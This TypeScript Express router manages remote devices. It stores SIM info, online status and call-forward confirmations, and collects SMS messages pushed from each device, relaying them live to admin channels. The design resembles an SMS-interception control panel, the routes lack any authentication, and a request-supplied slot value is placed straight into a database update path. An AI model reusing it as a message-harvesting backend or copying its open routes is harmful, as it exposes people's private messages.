// File: src/routes/devices.ts
import express, { Request, Response } from "express";
import logger from "../logger/logger";
import Device from "../models/Device";
import Sms from "../models/Sms";
import wsService from "../services/wsService";

const router = express.Router();

/* ================= LIST ALL DEVICES ================= */

router.get("/", async (_req, res) => {
  try {
    const devices = await Device.find().lean();
    return res.json(devices);
  } catch (err: any) {
    logger.error("devices: list failed", err);
    return res.status(500).json([]);
  }
});

/* ================= STATUS SNAPSHOT ================= */

router.get("/status", async (_req, res) => {
  try {
    const devices = await Device.find().lean();

    const statusMap: Record<
      string,
      { online: boolean; lastSeen: number | null }
    > = {};

    devices.forEach((d: any) => {
      if (!d.deviceId) return;

      statusMap[d.deviceId] = {
        online: d?.status?.online ?? false,
        lastSeen: d?.status?.timestamp ?? null,
      };
    });

    return res.json(statusMap);
  } catch (err: any) {
    logger.error("devices: status snapshot failed", err);
    return res.status(500).json({});
  }
});

/* ================= SIM INFO ================= */

router.get("/:deviceId/simInfo", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    const device = await Device.findOne({
      deviceId,
    }).lean();

    if (!device) {
      return res.status(404).json({
        success: false,
        error: "Device not found",
      });
    }

    return res.json(device?.simInfo || {});
  } catch (err: any) {
    logger.error("devices: simInfo failed", err);
    return res.status(500).json({});
  }
});

router.put("/:deviceId/simInfo", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    await Device.findOneAndUpdate(
      { deviceId },
      { $set: { simInfo: req.body } },
      { upsert: true }
    );

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update simInfo failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================ SIM SLOT UPDATE (CALL-FORWARD CONFIRMATION) ================ */
/**
 * Expected body:
 * { "status": "active" | "inactive", "updatedAt": <ms> }
 *
 * After DB write, this route will broadcast a 'simSlots' event to admin channels
 * (per-device + global) so admin UI can flip Pending->Success/Fail based on real device confirmation.
 */
router.put("/:deviceId/simSlots/:slot", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    const slot = (req.params.slot || "").toString().trim();

    if (!deviceId || slot === "") {
      return res.status(400).json({ success: false, error: "invalid params" });
    }

    const status = req.body?.status || (req.body?.active ? "active" : "inactive");
    const updatedAt = Number(req.body?.updatedAt || Date.now());

    // write sim slot status into Device document (adjust schema path as needed)
    const setObj: any = {};
    setObj[`simSlots.${slot}.status`] = status;
    setObj[`simSlots.${slot}.updatedAt`] = isNaN(updatedAt) ? Date.now() : updatedAt;

    await Device.findOneAndUpdate({ deviceId }, { $set: setObj }, { upsert: true });

    // build event payload for admins
    const payload = {
      type: "event",
      event: "simSlots",
      deviceId,
      data: {
        [slot]: { status, updatedAt: isNaN(updatedAt) ? Date.now() : updatedAt }
      },
      timestamp: Date.now()
    };

    // notify admins (per-device and global)
    try {
      wsService.sendToAdminDevice(deviceId, payload);
    } catch (e) {
      logger.warn("wsService notify simSlots failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update simSlot failed", err);
    return res.status(500).json({ success: false, error: err?.message });
  }
});

/* ================= NOTIFICATIONS ================= */

router.get("/notifications", async (_req, res) => {
  try {
    const list = await Sms.find().sort({ timestamp: -1 }).lean();

    const grouped: Record<string, any[]> = {};
    list.forEach((sms: any) => {
      const did = (sms.deviceId || "").toString().trim();
      if (!grouped[did]) grouped[did] = [];
      grouped[did].push(sms);
    });

    return res.json(grouped);
  } catch (e: any) {
    logger.error("notifications list failed", e);
    return res.status(500).json({});
  }
});

router.get("/notifications/devices", async (_req, res) => {
  try {
    const ids = await Sms.distinct("deviceId");
    // normalize/trim device ids
    const clean = ids.map((i: any) => (i || "").toString().trim());
    return res.json(clean);
  } catch (e: any) {
    logger.error("notifications devices failed", e);
    return res.status(500).json([]);
  }
});

router.get("/notifications/device/:deviceId", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    const since = Number(req.query.since || 0);

    const query: any = { deviceId };
    if (!isNaN(since) && since > 0) {
      query.timestamp = { $gte: since };
    }

    const msgs = await Sms.find(query).sort({ timestamp: -1 }).lean();
    return res.json(msgs);
  } catch (e: any) {
    logger.error("notifications device fetch failed", e);
    return res.status(500).json([]);
  }
});

/* ======= DELETE notifications for a single device (added) ======= */
router.delete("/notifications/device/:deviceId", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    await Sms.deleteMany({ deviceId });
    return res.json({ success: true });
  } catch (e: any) {
    logger.error("notifications delete for device failed", e);
    return res.status(500).json({ success: false, error: e?.message });
  }
});

router.delete("/notifications", async (_req, res) => {
  try {
    await Sms.deleteMany({});
    return res.json({ success: true });
  } catch (e: any) {
    logger.error("notifications delete all failed", e);
    return res.status(500).json({ success: false });
  }
});

router.delete("/notifications/olderThan/:cutoff", async (req, res) => {
  try {
    const cutoff = Number(req.params.cutoff || 0);
    await Sms.deleteMany({ timestamp: { $lt: cutoff } });
    return res.json({ success: true });
  } catch (e: any) {
    logger.error("notifications delete olderThan failed", e);
    return res.status(500).json({ success: false });
  }
});

/* ================= SMS PUSH (SAFE + WS EMIT) ================= */

router.post("/:id/sms", async (req: Request, res: Response) => {
  try {
    const deviceId = (req.params.id || "").toString().trim();

    const receiver =
      req.body.receiver ||
      req.body.receiverNumber ||
      req.body.address ||
      req.body.to ||
      req.body.phone ||
      "";

    if (!receiver) {
      logger.warn("devices:sms missing receiver", { body: req.body });
      return res.status(400).json({
        success: false,
        error: "receiver missing",
      });
    }

    // Defensive timestamp parsing
    const rawTs = req.body.timestamp;
    const parsedTs = Number(rawTs);
    const finalTimestamp =
      typeof parsedTs === "number" && !isNaN(parsedTs) && parsedTs > 0
        ? parsedTs
        : Date.now();

    const smsDoc = new Sms({
      deviceId,
      sender: req.body.sender || req.body.from || "unknown",
      senderNumber: req.body.senderNumber || req.body.from || "",
      receiver,
      title: req.body.title || "SMS",
      body: req.body.body || req.body.message || "",
      timestamp: finalTimestamp,
      meta: req.body.meta || {},
    });

    await smsDoc.save();

    // Try to emit a websocket notification to admin channels (non-fatal if not configured)
    try {
      const payload = {
        type: "event",
        event: "notification",
        deviceId,
        data: {
          id: smsDoc._id,
          title: smsDoc.title,
          sender: smsDoc.sender,
          senderNumber: smsDoc.senderNumber,
          receiver: smsDoc.receiver,
          body: smsDoc.body,
          timestamp: smsDoc.timestamp,
          meta: smsDoc.meta || {},
        },
        timestamp: Date.now()
      };

      // prefer wsService (if available)
      try {
        wsService.sendToAdminDevice(deviceId, payload);
      } catch (wsErr) {
        // fallback: if you also have socket.io attached to app, emit there
        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
        if (io && typeof io.emit === "function") {
          io.emit("event", payload);
        }
      }
    } catch (emitErr) {
      logger.warn("WS emit failed (non-fatal)", emitErr);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("SMS save failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= DEVICE GET ================= */

router.get("/:deviceId", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    const device = await Device.findOne({
      deviceId,
    }).lean();

    if (!device) {
      return res.status(404).json({
        success: false,
        error: "Device not found",
      });
    }

    return res.json(device);
  } catch (err: any) {
    logger.error("devices: get single failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= STATUS UPDATE ================= */

router.put("/:deviceId/status", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    const online = !!req.body?.online;
    const ts = Number(req.body?.timestamp || Date.now());

    await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          "status.online": online,
          "status.timestamp": isNaN(ts) ? Date.now() : ts,
        },
      },
      { upsert: true }
    );

    // notify admin channels via wsService (preferred)
    try {
      const payload = {
        type: "event",
        event: "status",
        deviceId,
        data: { online, timestamp: isNaN(ts) ? Date.now() : ts },
        timestamp: Date.now()
      };
      try {
        wsService.sendToAdminDevice(deviceId, payload);
      } catch (wsErr) {
        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
        if (io && typeof io.emit === "function") io.emit("event", payload);
      }
    } catch (e) {
      logger.warn("WS emit status failed (non-fatal)", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update status failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= UPDATE METADATA ================= */

router.put("/:deviceId", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    await Device.findOneAndUpdate(
      { deviceId },
      { $set: { metadata: req.body } },
      { upsert: true }
    );

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update metadata failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= DELETE ================= */

router.delete("/status/:deviceId", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    await Device.updateOne(
      { deviceId },
      {
        $set: {
          "status.online": false,
          "status.timestamp": Date.now(),
        },
      }
    );

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: delete status failed", err);
    return res.status(500).json({ success: false });
  }
});

router.delete("/:deviceId", async (req, res) => {
  try {
    const deviceId = (req.params.deviceId || "").toString().trim();
    await Device.deleteOne({ deviceId });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: delete failed", err);
    return res.status(500).json({ success: false });
  }
});

export default router;
